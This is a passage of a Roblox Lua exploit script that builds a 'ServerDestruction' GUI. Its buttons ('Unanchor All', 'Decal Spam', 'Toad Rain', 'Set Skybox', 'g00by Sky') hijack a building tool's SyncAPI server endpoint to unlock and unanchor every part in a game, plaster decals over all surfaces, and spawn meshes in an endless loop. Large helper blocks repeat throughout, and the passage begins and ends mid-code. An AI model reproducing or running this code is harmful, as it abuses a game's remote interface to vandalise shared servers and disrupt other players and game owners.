	function Sky(id)
		e = char.HumanoidRootPart.CFrame.x
		f = char.HumanoidRootPart.CFrame.y
		g = char.HumanoidRootPart.CFrame.z
		CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,6,0),workspace)
		for i,v in game.Workspace:GetDescendants() do
			if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
				--spawn(function()
				SetName(v,"Sky")
				AddMesh(v)
				--end)
				--spawn(function()
				SetMesh(v,"8006679977")
				SetTexture(v,id)
				--end)
				MeshResize(v,Vector3.new(50,50,50))
				SetLocked(v,true)
			end
		end
	end
	Sky("8408806737")

local player = game.Players.LocalPlayer
local char = player.Character
local tool
for i,v in player:GetDescendants() do
	if v.Name == "SyncAPI" then
		tool = v.Parent
	end
end
for i,v in game.ReplicatedStorage:GetDescendants() do
	if v.Name == "SyncAPI" then
		tool = v.Parent
	end
end
--craaa
remote = tool.SyncAPI.ServerEndpoint
function _(args)
	remote:InvokeServer(unpack(args))
end
function SetCollision(part,boolean)
	local args = {
		[1] = "SyncCollision",
		[2] = {
			[1] = {
				["Part"] = part,
				["CanCollide"] = boolean
			}
		}
	}
	_(args)
end
function SetAnchor(boolean,part)
	local args = {
		[1] = "SyncAnchor",
		[2] = {
			[1] = {
				["Part"] = part,
				["Anchored"] = boolean
			}
		}
	}
	_(args)
end
function CreatePart(cf,parent)
	local args = {
		[1] = "CreatePart",
		[2] = "Normal",
		[3] = cf,
		[4] = parent
	}
	_(args)
end
function DestroyPart(part)
	local args = {
		[1] = "Remove",
		[2] = {
			[1] = part
		}
	}
	_(args)
end
function MovePart(part,cf)
	local args = {
		[1] = "SyncMove",
		[2] = {
			[1] = {
				["Part"] = part,
				["CFrame"] = cf
			}
		}
	}
	_(args)
end
function Resize(part,size,cf)
	local args = {
		[1] = "SyncResize",
		[2] = {
			[1] = {
				["Part"] = part,
				["CFrame"] = cf,
				["Size"] = size
			}
		}
	}
	_(args)
end
function AddMesh(part)
	local args = {
		[1] = "CreateMeshes",
		[2] = {
			[1] = {
				["Part"] = part
			}
		}
	}
	_(args)
end

function SetMesh(part,meshid)
	local args = {
		[1] = "SyncMesh",
		[2] = {
			[1] = {
				["Part"] = part,
				["MeshId"] = "rbxassetid://"..meshid
			}
		}
	}
	_(args)
end
function SetTexture(part, texid)
	local args = {
		[1] = "SyncMesh",
		[2] = {
			[1] = {
				["Part"] = part,
				["TextureId"] = "rbxassetid://"..texid
			}
		}
	}
	_(args)
end
function SetName(part, stringg)
	local args = {
		[1] = "SetName",
		[2] = {
			[1] = part
		},
		[3] = stringg
	}

	_(args)
end
function MeshResize(part,size)
	local args = {
		[1] = "SyncMesh",
		[2] = {
			[1] = {
				["Part"] = part,
				["Scale"] = size
			}
		}
	}
	_(args)
end
function Weld(part1, part2,lead)
	local args = {
		[1] = "CreateWelds",
		[2] = {
			[1] = part1,
			[2] = part2
		},
		[3] = lead
	}
	_(args)

end
function SetLocked(part,boolean)
	local args = {
		[1] = "SetLocked",
		[2] = {
			[1] = part
		},
		[3] = boolean
	}
	_(args)
end
function SetTrans(part,int)
	local args = {
		[1] = "SyncMaterial",
		[2] = {
			[1] = {
				["Part"] = part,
				["Transparency"] = int
			}
		}
	}
	_(args)
end
function CreateSpotlight(part)
	local args = {
		[1] = "CreateLights",
		[2] = {
			[1] = {
				["Part"] = part,
				["LightType"] = "SpotLight"
			}
		}
	}
	_(args)
end
function SyncLighting(part,brightness)
	local args = {
		[1] = "SyncLighting",
		[2] = {
			[1] = {
				["Part"] = part,
				["LightType"] = "SpotLight",
				["Brightness"] = brightness
			}
		}
	}
	_(args)
end
function Color(part,color)
	local args = {
		[1] = "SyncColor",
		[2] = {
			[1] = {
				["Part"] = part,
				["Color"] = color --[[Color3]],
				["UnionColoring"] = false
			}
		}
	}
	_(args)
end
function SpawnDecal(part,side)
	local args = {
		[1] = "CreateTextures",
		[2] = {
			[1] = {
				["Part"] = part,
				["Face"] = side,
				["TextureType"] = "Decal"
			}
		}
	}

	_(args)
end
function AddDecal(part,asset,side)
	local args = {
		[1] = "SyncTexture",
		[2] = {
			[1] = {
				["Part"] = part,
				["Face"] = side,
				["TextureType"] = "Decal",
				["Texture"] = "rbxassetid://".. asset
			}
		}
	}
	_(args)
end

function spam(id)
	for i,v in game.workspace:GetDescendants() do
		if v:IsA("BasePart") then
			spawn(function()
				SetLocked(v,false)
				SpawnDecal(v,Enum.NormalId.Front)
				AddDecal(v,id,Enum.NormalId.Front)

				SpawnDecal(v,Enum.NormalId.Back)
				AddDecal(v,id,Enum.NormalId.Back)

				SpawnDecal(v,Enum.NormalId.Right)
				AddDecal(v,id,Enum.NormalId.Right)

				SpawnDecal(v,Enum.NormalId.Left)
				AddDecal(v,id,Enum.NormalId.Left)

				SpawnDecal(v,Enum.NormalId.Bottom)
				AddDecal(v,id,Enum.NormalId.Bottom)

				SpawnDecal(v,Enum.NormalId.Top)
				AddDecal(v,id,Enum.NormalId.Top)
			end)
		end
	end 
end
spam("8408806737")

local player = game.Players.LocalPlayer
local char = player.Character
local tool
for i,v in player:GetDescendants() do
	if v.Name == "SyncAPI" then
		tool = v.Parent
	end
end
for i,v in game.ReplicatedStorage:GetDescendants() do
	if v.Name == "SyncAPI" then
		tool = v.Parent
	end
end
--craaa
remote = tool.SyncAPI.ServerEndpoint
function _(args)
	remote:InvokeServer(unpack(args))
end
function SetCollision(part,boolean)
	local args = {
		[1] = "SyncCollision",
		[2] = {
			[1] = {
				["Part"] = part,
				["CanCollide"] = boolean
			}
		}
	}
	_(args)
end
function SetAnchor(boolean,part)
	local args = {
		[1] = "SyncAnchor",
		[2] = {
			[1] = {
				["Part"] = part,
				["Anchored"] = boolean
			}
		}
	}
	_(args)
end
function CreatePart(cf,parent)
	local args = {
		[1] = "CreatePart",
		[2] = "Normal",
		[3] = cf,
		[4] = parent
	}
	_(args)
end
function DestroyPart(part)
	local args = {
		[1] = "Remove",
		[2] = {
			[1] = part
		}
	}
	_(args)
end
function MovePart(part,cf)
	local args = {
		[1] = "SyncMove",
		[2] = {
			[1] = {
				["Part"] = part,
				["CFrame"] = cf
			}
		}
	}
	_(args)
end
function Resize(part,size,cf)
	local args = {
		[1] = "SyncResize",
		[2] = {
			[1] = {
				["Part"] = part,
				["CFrame"] = cf,
				["Size"] = size
			}
		}
	}
	_(args)
end
function AddMesh(part)
	local args = {
		[1] = "CreateMeshes",
		[2] = {
			[1] = {
				["Part"] = part
			}
		}
	}
	_(args)
end

function SetMesh(part,meshid)
	local args = {
		[1] = "SyncMesh",
		[2] = {
			[1] = {
				["Part"] = part,
				["MeshId"] = "rbxassetid://"..meshid
			}
		}
	}
	_(args)
end
function SetTexture(part, texid)
	local args = {
		[1] = "SyncMesh",
		[2] = {
			[1] = {
				["Part"] = part,
				["TextureId"] = "rbxassetid://"..texid
			}
		}
	}
	_(args)
end
function SetName(part, stringg)
	local args = {
		[1] = "SetName",
		[2] = {
			[1] = workspace.Part
		},
		[3] = stringg
	}

	_(args)
end
function MeshResize(part,size)
	local args = {
		[1] = "SyncMesh",
		[2] = {
			[1] = {
				["Part"] = part,
				["Scale"] = size
			}
		}
	}
	_(args)
end
function Weld(part1, part2,lead)
	local args = {
		[1] = "CreateWelds",
		[2] = {
			[1] = part1,
			[2] = part2
		},
		[3] = lead
	}
	_(args)

end
function SetLocked(part,boolean)
	local args = {
		[1] = "SetLocked",
		[2] = {
			[1] = part
		},
		[3] = boolean
	}
	_(args)
end
function SetTrans(part,int)
	local args = {
		[1] = "SyncMaterial",
		[2] = {
			[1] = {
				["Part"] = part,
				["Transparency"] = int
			}
		}
	}
	_(args)
end
function CreateSpotlight(part)
	local args = {
		[1] = "CreateLights",
		[2] = {
			[1] = {
				["Part"] = part,
				["LightType"] = "SpotLight"
			}
		}
	}
	_(args)
end
function SyncLighting(part,brightness)
	local args = {
		[1] = "SyncLighting",
		[2] = {
			[1] = {
				["Part"] = part,
				["LightType"] = "SpotLight",
				["Brightness"] = brightness
			}
		}
	}
	_(args)
end

function Unanchor()
	for i,v in game.Workspace:GetDescendants() do
		spawn(function()
			SetLocked(v,false)
			SetAnchor(false,v)
		end)
	end
end
Unanchor()

end)

TextButton_9.Parent = ServerDestruction
TextButton_9.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
TextButton_9.BorderColor3 = Color3.fromRGB(255, 0, 0)
TextButton_9.BorderSizePixel = 3
TextButton_9.Position = UDim2.new(0, 0, 0, 99)
TextButton_9.Size = UDim2.new(0.5, 0, 0, 30)
TextButton_9.ZIndex = 2
TextButton_9.Font = Enum.Font.SourceSans
TextButton_9.Text = "Unanchor All"
TextButton_9.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_9.TextSize = 14.000
TextButton_9.MouseButton1Down:connect(function()
local player = game.Players.LocalPlayer
local char = player.Character
local tool
for i,v in player:GetDescendants() do
	if v.Name == "SyncAPI" then
		tool = v.Parent
	end
end
for i,v in game.ReplicatedStorage:GetDescendants() do
	if v.Name == "SyncAPI" then
		tool = v.Parent
	end
end
--craaa
remote = tool.SyncAPI.ServerEndpoint
function _(args)
	remote:InvokeServer(unpack(args))
end
function SetCollision(part,boolean)
	local args = {
		[1] = "SyncCollision",
		[2] = {
			[1] = {
				["Part"] = part,
				["CanCollide"] = boolean
			}
		}
	}
	_(args)
end
function SetAnchor(boolean,part)
	local args = {
		[1] = "SyncAnchor",
		[2] = {
			[1] = {
				["Part"] = part,
				["Anchored"] = boolean
			}
		}
	}
	_(args)
end
function CreatePart(cf,parent)
	local args = {
		[1] = "CreatePart",
		[2] = "Normal",
		[3] = cf,
		[4] = parent
	}
	_(args)
end
function DestroyPart(part)
	local args = {
		[1] = "Remove",
		[2] = {
			[1] = part
		}
	}
	_(args)
end
function MovePart(part,cf)
	local args = {
		[1] = "SyncMove",
		[2] = {
			[1] = {
				["Part"] = part,
				["CFrame"] = cf
			}
		}
	}
	_(args)
end
function Resize(part,size,cf)
	local args = {
		[1] = "SyncResize",
		[2] = {
			[1] = {
				["Part"] = part,
				["CFrame"] = cf,
				["Size"] = size
			}
		}
	}
	_(args)
end
function AddMesh(part)
	local args = {
		[1] = "CreateMeshes",
		[2] = {
			[1] = {
				["Part"] = part
			}
		}
	}
	_(args)
end

function SetMesh(part,meshid)
	local args = {
		[1] = "SyncMesh",
		[2] = {
			[1] = {
				["Part"] = part,
				["MeshId"] = "rbxassetid://"..meshid
			}
		}
	}
	_(args)
end
function SetTexture(part, texid)
	local args = {
		[1] = "SyncMesh",
		[2] = {
			[1] = {
				["Part"] = part,
				["TextureId"] = "rbxassetid://"..texid
			}
		}
	}
	_(args)
end
function SetName(part, stringg)
	local args = {
		[1] = "SetName",
		[2] = {
			[1] = workspace.Part
		},
		[3] = stringg
	}

	_(args)
end
function MeshResize(part,size)
	local args = {
		[1] = "SyncMesh",
		[2] = {
			[1] = {
				["Part"] = part,
				["Scale"] = size
			}
		}
	}
	_(args)
end
function Weld(part1, part2,lead)
	local args = {
		[1] = "CreateWelds",
		[2] = {
			[1] = part1,
			[2] = part2
		},
		[3] = lead
	}
	_(args)

end
function SetLocked(part,boolean)
	local args = {
		[1] = "SetLocked",
		[2] = {
			[1] = part
		},
		[3] = boolean
	}
	_(args)
end
function SetTrans(part,int)
	local args = {
		[1] = "SyncMaterial",
		[2] = {
			[1] = {
				["Part"] = part,
				["Transparency"] = int
			}
		}
	}
	_(args)
end
function CreateSpotlight(part)
	local args = {
		[1] = "CreateLights",
		[2] = {
			[1] = {
				["Part"] = part,
				["LightType"] = "SpotLight"
			}
		}
	}
	_(args)
end
function SyncLighting(part,brightness)
	local args = {
		[1] = "SyncLighting",
		[2] = {
			[1] = {
				["Part"] = part,
				["LightType"] = "SpotLight",
				["Brightness"] = brightness
			}
		}
	}
	_(args)
end

function Unanchor()
	for i,v in game.Workspace:GetDescendants() do
		spawn(function()
			SetLocked(v,false)
			SetAnchor(false,v)
		end)
	end
end
Unanchor()

end)

TextButton_10.Parent = ServerDestruction
TextButton_10.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
TextButton_10.BorderColor3 = Color3.fromRGB(255, 0, 0)
TextButton_10.BorderSizePixel = 3
TextButton_10.Position = UDim2.new(0.5, 3, 0, 33)
TextButton_10.Size = UDim2.new(0.5, -3, 0, 30)
TextButton_10.ZIndex = 2
TextButton_10.Font = Enum.Font.SourceSans
TextButton_10.Text = "Toad Rain"
TextButton_10.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_10.TextSize = 14.000
TextButton_10.MouseButton1Down:connect(function()
	--rgrg
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	--craaa
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = workspace
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = workspace.Part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = workspace.Part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	hrpcf = player.Character.HumanoidRootPart.CFrame
	while wait(0.5) do
		x = hrpcf.x
		z = hrpcf.z
		randint = math.random(-600,600)
		randint2 = math.random(-600,600)
		xloc = randint + x
		zloc = randint2 + z
		cf = player.Character.HumanoidRootPart.CFrame.y + 400
		spawn(function()
			CreatePart(CFrame.new(math.floor(xloc), math.random(cf,cf+400), math.floor(zloc)))
			for i,v in game.Workspace:GetDescendants() do
				if v.Name == "Part" and v.Parent == workspace and v.CFrame.x == math.floor(xloc) and v.CFrame.z == math.floor(zloc) then
					SetName(v,"b_1337")
					SetAnchor(false,v)
					AddMesh(v)
					Resize(v, Vector3.new(100,100,100),v.CFrame)
					MeshResize(v,Vector3.new(8,8,8))
					SetMesh(v,"5038530279")
					SetTexture(v, "5038530309")
					SetCollision(v,false)
				else
				end
			end	
		end)
	end
end)

TextButton_11.Parent = ServerDestruction
TextButton_11.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
TextButton_11.BorderColor3 = Color3.fromRGB(255, 0, 0)
TextButton_11.BorderSizePixel = 3
TextButton_11.Position = UDim2.new(0.5, 3, 0, 66)
TextButton_11.Size = UDim2.new(0.5, -3, 0, 30)
TextButton_11.ZIndex = 2
TextButton_11.Font = Enum.Font.SourceSans
TextButton_11.Text = "Set Skybox"
TextButton_11.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_11.TextSize = 14.000
TextButton_11.MouseButton1Down:connect(function()
--rgrg
local player = game.Players.LocalPlayer
local char = player.Character
local tool
for i,v in player:GetDescendants() do
	if v.Name == "SyncAPI" then
		tool = v.Parent
	end
end
for i,v in game.ReplicatedStorage:GetDescendants() do
	if v.Name == "SyncAPI" then
		tool = v.Parent
	end
end
--craaa
remote = tool.SyncAPI.ServerEndpoint
function _(args)
	remote:InvokeServer(unpack(args))
end
function SetCollision(part,boolean)
	local args = {
		[1] = "SyncCollision",
		[2] = {
			[1] = {
				["Part"] = part,
				["CanCollide"] = boolean
			}
		}
	}
	_(args)
end
function SetAnchor(boolean,part)
	local args = {
		[1] = "SyncAnchor",
		[2] = {
			[1] = {
				["Part"] = part,
				["Anchored"] = boolean
			}
		}
	}
	_(args)
end
function CreatePart(cf,parent)
	local args = {
		[1] = "CreatePart",
		[2] = "Normal",
		[3] = cf,
		[4] = parent
	}
	_(args)
end
function DestroyPart(part)
	local args = {
		[1] = "Remove",
		[2] = {
			[1] = part
		}
	}
	_(args)
end
function MovePart(part,cf)
	local args = {
		[1] = "SyncMove",
		[2] = {
			[1] = {
				["Part"] = part,
				["CFrame"] = cf
			}
		}
	}
	_(args)
end
function Resize(part,size,cf)
	local args = {
		[1] = "SyncResize",
		[2] = {
			[1] = {
				["Part"] = part,
				["CFrame"] = cf,
				["Size"] = size
			}
		}
	}
	_(args)
end
function AddMesh(part)
	local args = {
		[1] = "CreateMeshes",
		[2] = {
			[1] = {
				["Part"] = part
			}
		}
	}
	_(args)
end

function SetMesh(part,meshid)
	local args = {
		[1] = "SyncMesh",
		[2] = {
			[1] = {
				["Part"] = part,
				["MeshId"] = "rbxassetid://"..meshid
			}
		}
	}
	_(args)
end
function SetTexture(part, texid)
	local args = {
		[1] = "SyncMesh",
		[2] = {
			[1] = {
				["Part"] = part,
				["TextureId"] = "rbxassetid://"..texid
			}
		}
	}
	_(args)
end
function SetName(part, stringg)
	local args = {
		[1] = "SetName",
		[2] = {
			[1] = part
		},
		[3] = stringg
	}

	_(args)
end
function MeshResize(part,size)
	local args = {
		[1] = "SyncMesh",
		[2] = {
			[1] = {
				["Part"] = part,
				["Scale"] = size
			}
		}
	}
	_(args)
end
function Weld(part1, part2,lead)
	local args = {
		[1] = "CreateWelds",
		[2] = {
			[1] = part1,
			[2] = part2
		},
		[3] = lead
	}
	_(args)

end
function SetLocked(part,boolean)
	local args = {
		[1] = "SetLocked",
		[2] = {
			[1] = part
		},
		[3] = boolean
	}
	_(args)
end
function SetTrans(part,int)
	local args = {
		[1] = "SyncMaterial",
		[2] = {
			[1] = {
				["Part"] = part,
				["Transparency"] = int
			}
		}
	}
	_(args)
end
function CreateSpotlight(part)
	local args = {
		[1] = "CreateLights",
		[2] = {
			[1] = {
				["Part"] = part,
				["LightType"] = "SpotLight"
			}
		}
	}
	_(args)
end
function SyncLighting(part,brightness)
	local args = {
		[1] = "SyncLighting",
		[2] = {
			[1] = {
				["Part"] = part,
				["LightType"] = "SpotLight",
				["Brightness"] = brightness
			}
		}
	}
	_(args)
end
function Color(part,color)
	local args = {
		[1] = "SyncColor",
		[2] = {
			[1] = {
				["Part"] = part,
				["Color"] = color --[[Color3]],
				["UnionColoring"] = false
			}
		}
	}
	_(args)
end
function SpawnDecal(part,side)
	local args = {
		[1] = "CreateTextures",
		[2] = {
			[1] = {
				["Part"] = part,
				["Face"] = side,
				["TextureType"] = "Decal"
			}
		}
	}

	_(args)
end
function AddDecal(part,asset,side)
	local args = {
		[1] = "SyncTexture",
		[2] = {
			[1] = {
				["Part"] = part,
				["Face"] = side,
				["TextureType"] = "Decal",
				["Texture"] = "rbxassetid://".. asset
			}
		}
	}
	_(args)
end

function Sky(id)
	e = char.HumanoidRootPart.CFrame.x
	f = char.HumanoidRootPart.CFrame.y
	g = char.HumanoidRootPart.CFrame.z
	CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,6,0),workspace)
	for i,v in game.Workspace:GetDescendants() do
		if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
			--spawn(function()
			SetName(v,"Sky")
			AddMesh(v)
			--end)
			--spawn(function()
			SetMesh(v,"8006679977")
			SetTexture(v,id)
			--end)
			MeshResize(v,Vector3.new(50,50,50))
			SetLocked(v,true)
		end
	end
end
Sky("8408806737")
end)

TextButton_12.Parent = ServerDestruction
TextButton_12.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
TextButton_12.BorderColor3 = Color3.fromRGB(255, 0, 0)
TextButton_12.BorderSizePixel = 3
TextButton_12.Position = UDim2.new(0.5, 3, 0, 99)
TextButton_12.Size = UDim2.new(0.5, -3, 0, 30)
TextButton_12.ZIndex = 2
TextButton_12.Font = Enum.Font.SourceSans
TextButton_12.Text = "Decal Spam"
TextButton_12.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_12.TextSize = 14.000
TextButton_12.MouseButton1Down:connect(function()
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end

		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = part
				},
				[3] = stringg
			}

			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)

		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
		function Color(part,color)
			local args = {
				[1] = "SyncColor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Color"] = color --[[Color3]],
						["UnionColoring"] = false
					}
				}
			}
			_(args)
		end
		function SpawnDecal(part,side)
			local args = {
				[1] = "CreateTextures",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal"
					}
				}
			}

			_(args)
		end
		function AddDecal(part,asset,side)
			local args = {
				[1] = "SyncTexture",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal",
						["Texture"] = "rbxassetid://".. asset
					}
				}
			}
			_(args)
		end

		function spam(id)
			for i,v in game.workspace:GetDescendants() do
				if v:IsA("BasePart") then
					spawn(function()
						SetLocked(v,false)
						SpawnDecal(v,Enum.NormalId.Front)
						AddDecal(v,id,Enum.NormalId.Front)

						SpawnDecal(v,Enum.NormalId.Back)
						AddDecal(v,id,Enum.NormalId.Back)

						SpawnDecal(v,Enum.NormalId.Right)
						AddDecal(v,id,Enum.NormalId.Right)

						SpawnDecal(v,Enum.NormalId.Left)
						AddDecal(v,id,Enum.NormalId.Left)

						SpawnDecal(v,Enum.NormalId.Bottom)
						AddDecal(v,id,Enum.NormalId.Bottom)

						SpawnDecal(v,Enum.NormalId.Top)
						AddDecal(v,id,Enum.NormalId.Top)
					end)
				end
			end 
		end
		spam("8408806737")
		end)

TextButton_13.Parent = ServerDestruction
TextButton_13.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
TextButton_13.BorderColor3 = Color3.fromRGB(255, 0, 0)
TextButton_13.BorderSizePixel = 3
TextButton_13.Position = UDim2.new(0, 0, 0, 132)
TextButton_13.Size = UDim2.new(0.5, 0, 0, 30)
TextButton_13.ZIndex = 2
TextButton_13.Font = Enum.Font.SourceSans
TextButton_13.Text = "g00by Sky"
TextButton_13.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_13.TextSize = 14.000
TextButton_13.MouseButton1Down:connect(function()
	--rgrg
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	--craaa
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function Color(part,color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color --[[Color3]],
					["UnionColoring"] = false
				}
			}
		}
		_(args)
	end
	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
